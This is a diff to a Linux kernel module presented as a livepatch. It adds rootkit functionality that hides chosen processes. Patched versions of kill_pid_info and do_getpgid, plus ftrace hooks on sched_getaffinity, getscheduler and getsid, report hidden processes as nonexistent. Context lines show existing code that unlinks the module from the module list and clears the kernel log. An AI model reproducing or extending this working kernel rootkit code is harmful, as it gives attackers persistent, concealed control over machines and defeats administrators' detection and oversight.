@@ -28,6 +28,7 @@
 #include <linux/dynamic_debug.h>
 #include <linux/audit.h>
 #include <linux/string.h>
+#include "ftrace_hook.h"
 
 
 #define FIRST_PROCESS_ENTRY 256
@@ -138,6 +139,15 @@ static struct klp_ops * (*p_klp_find_ops)(void *old_func) = NULL;
 static struct ftrace_func_entry *(*p_ftrace_lookup_ip)(struct ftrace_hash *hash, unsigned long ip) = NULL;
 static struct ftrace_page       **p_ftrace_pages_start = NULL;
 
+
+static int (*p_group_send_sig_info)(int sig, struct kernel_siginfo *info,
+                        struct task_struct *p, enum pid_type type) = NULL;
+
+static int (*p_security_task_getpgid)(struct task_struct *p) = NULL;
+static struct task_struct * (*p_find_task_by_vpid)(pid_t vnr) = NULL;
+
+static rwlock_t *p_tasklist_lock = NULL;
+
 static bool has_pid_permissions(struct pid_namespace *pid,
                                  struct task_struct *task,
                                  int hide_pid_min)
@@ -188,6 +198,22 @@ static int is_hidden_proc_name(const char *name, int len_name)
 
 end:
 	return 0;
+}
+
+static int is_hidden_proc(struct task_struct *task) 
+{
+	int ret = 0;
+	if (hidden_base_exe) {
+		if (get_task_exe(exe_buf, sizeof(exe_buf), task) > 0) {
+			if (is_hidden_proc_name(exe_buf, sizeof(exe_buf)))
+				ret = 1;
+		}
+	} else {
+		if (is_hidden_proc_name(task->comm, sizeof(task->comm)))
+			ret = 1;
+	}
+
+	return ret;
 }
 
 static struct dentry *livepatch_proc_pid_lookup(struct dentry *dentry, unsigned int flags)
@@ -494,6 +520,66 @@ static void livepatch__audit_bprm(struct linux_binprm *bprm)
 	return;
 }
 
+static int livepatch_kill_pid_info(int sig, struct kernel_siginfo *info, struct pid *pid)
+{
+        int error = -ESRCH;
+        struct task_struct *p;
+
+	rcu_read_lock();
+	p = pid_task(pid, PIDTYPE_PID);
+	if (p && is_hidden_proc(p) && sig != SIGKILL) {
+		rcu_read_unlock();
+		return error;
+	}
+	rcu_read_unlock();
+
+        for (;;) {
+                rcu_read_lock();
+                p = pid_task(pid, PIDTYPE_PID);
+                if (p)
+                        error = p_group_send_sig_info(sig, info, p, PIDTYPE_TGID);
+                rcu_read_unlock();
+                if (likely(!p || error != -ESRCH))
+                        return error;
+
+                /*
+                 * The task was unhashed in between, try again.  If it
+                 * is dead, pid_task() will return NULL, if we race with
+                 * de_thread() it will find the new leader.
+                 */
+        }
+}
+
+static int livepatch_do_getpgid(pid_t pid)
+{
+        struct task_struct *p;
+        struct pid *grp;
+        int retval;
+
+        rcu_read_lock();
+        if (!pid)
+                grp = task_pgrp(current);
+        else {
+                retval = -ESRCH;
+                p = p_find_task_by_vpid(pid);
+                if (!p)
+                        goto out;
+		if (is_hidden_proc(p))
+                        goto out;
+                grp = task_pgrp(p);
+                if (!grp)
+                        goto out;
+
+                retval = p_security_task_getpgid(p);
+                if (retval)
+                        goto out;
+        }
+        retval = pid_vnr(grp);
+out:
+        rcu_read_unlock();
+        return retval;
+}
+
 static void hidden_module(struct module *mod) {
 	//del from 'modules' list
 	list_del(&mod->list);
@@ -675,8 +761,8 @@ static void clear_klog(void)
 	u64 seq;
 	u32 idx;
 
-	u64 sum_seq = 0;
-	u32 sum_idx = 0;
+	//u64 sum_seq = 0;
+	//u32 sum_idx = 0;
 	//int flag = 0;
 
 	logbuf_lock_irq();      
@@ -718,6 +804,120 @@ static void clear_klog(void)
 	logbuf_unlock_irq();      
 }
 
+#ifdef PTREGS_SYSCALL_STUBS
+static asmlinkage int (*real_sys_getpriority) (struct pt_regs * regs) = NULL;
+static asmlinkage int ftrace_sys_getpriority(struct pt_regs *regs)
+{
+        return real_sys_getpriority(regs);
+}
+
+static asmlinkage long (*real_sched_getaffinity)(struct pt_regs *regs) = NULL;
+static asmlinkage long ftrace_sched_getaffinity(struct pt_regs *regs)
+{
+	return real_sched_getaffinity(regs);
+}
+
+static asmlinkage long (*real_security_task_getscheduler)(struct pt_regs *regs) = NULL;
+static asmlinkage long ftrace_security_task_getscheduler(struct pt_regs *regs)
+{
+	return real_security_task_getscheduler(regs);
+}
+
+static asmlinkage long (*real_security_task_getsid)(struct pt_regs *regs) = NULL;
+static asmlinkage long ftrace_security_task_getsid(struct pt_regs *regs)
+{
+	return real_security_task_getsid(regs);
+}
+#else
+
+static asmlinkage int (*real_sys_getpriority) (int which, int who) = NULL;
+static asmlinkage int ftrace_sys_getpriority(int which, int who)
+{
+	struct task_struct *p = NULL;
+	int ret = 0;
+
+	rcu_read_lock();
+	if (which == PRIO_PROCESS && who > 0) {
+		//p = p_find_task_by_vpid(who);
+		printk(KERN_INFO "which:%d pid:%d", which, who);
+		#if 0
+		if (p)
+			get_task_struct(p); 
+		#endif
+
+
+		#if 0
+		if (p) {
+			if (is_hidden_proc(p))
+				ret = -ESRCH;
+			put_task_struct(p); 
+		}
+		#endif
+	}
+	rcu_read_unlock();
+	if (ret == -ESRCH)
+		return ret; 
+
+        return real_sys_getpriority(which, who);
+}
+
+
+static asmlinkage long (*real_sched_getaffinity)(pid_t pid, struct cpumask *mask) = NULL;
+static asmlinkage long ftrace_sched_getaffinity(pid_t pid, struct cpumask *mask)
+{
+	struct task_struct *p = NULL;
+	int ret = 0;
+
+	rcu_read_lock();
+	p = p_find_task_by_vpid(pid);
+	if (p)
+		get_task_struct(p); 
+	rcu_read_unlock();
+
+	if (p) {
+		if (is_hidden_proc(p))
+			ret = -ESRCH;
+		put_task_struct(p); 
+	}
+	if (ret == -ESRCH)
+		return ret; 
+
+	return real_sched_getaffinity(pid, mask);
+}
+
+
+static asmlinkage int (*real_security_task_getscheduler)(struct task_struct *p) = NULL;
+static asmlinkage int ftrace_security_task_getscheduler(struct task_struct *p)
+{
+	if (p) {
+		if (is_hidden_proc(p))
+			return -ESRCH;
+	}
+
+	return real_security_task_getscheduler(p);
+}
+
+
+static asmlinkage int (*real_security_task_getsid)(struct task_struct *p) = NULL;
+static asmlinkage int ftrace_security_task_getsid(struct task_struct *p)
+{
+	if (p) {
+		if (is_hidden_proc(p))
+			return -ESRCH;
+	}
+
+	return real_security_task_getsid(p);
+}
+#endif
+
+static struct ftrace_hook hooks[] = {
+        //HOOK("__x64_sys_getpriority", ftrace_sys_getpriority, &real_sys_getpriority),
+        HOOK("sched_getaffinity", ftrace_sched_getaffinity, &real_sched_getaffinity),
+        HOOK("security_task_getscheduler", ftrace_security_task_getscheduler, &real_security_task_getscheduler),
+        HOOK("security_task_getsid", ftrace_security_task_getsid, &real_security_task_getsid),
+};
+
+
 static struct klp_func funcs[] = {
 	{
 		.old_name = "proc_pid_readdir",
@@ -742,6 +942,14 @@ static struct klp_func funcs[] = {
 	{
 		.old_name = "module_get_kallsym",
 		.new_func = livepatch_module_get_kallsym,
+	},
+	{
+		.old_name = "kill_pid_info",
+		.new_func = livepatch_kill_pid_info,
+	}, 
+	{
+		.old_name = "do_getpgid",
+		.new_func = livepatch_do_getpgid,
 	}, { }
 };
 
@@ -893,6 +1101,24 @@ static int livepatch_init(void)
 				 kallsyms_lookup_name("find_task_by_pid_ns");
 	if (!p_find_task_by_pid_ns)
 		return -1;
+
+	p_group_send_sig_info = (int (*)(int sig, struct kernel_siginfo *info, struct task_struct *p, enum pid_type type))
+				 kallsyms_lookup_name("group_send_sig_info");
+	if (!p_group_send_sig_info)
+		return -1;
+
+	p_find_task_by_vpid = (struct task_struct *(*)(pid_t vnr))
+				 kallsyms_lookup_name("find_task_by_vpid");
+	if (!p_find_task_by_vpid)
+		return -1;
+	
+	p_security_task_getpgid = (int (*)(struct task_struct *p))
+				 kallsyms_lookup_name("security_task_getpgid");
+	if (!p_security_task_getpgid)
+		return -1;
+
+	
+	fh_install_hooks(hooks, ARRAY_SIZE(hooks));
 
 	save_tainted_mask();
 	ret = klp_enable_patch(&patch);
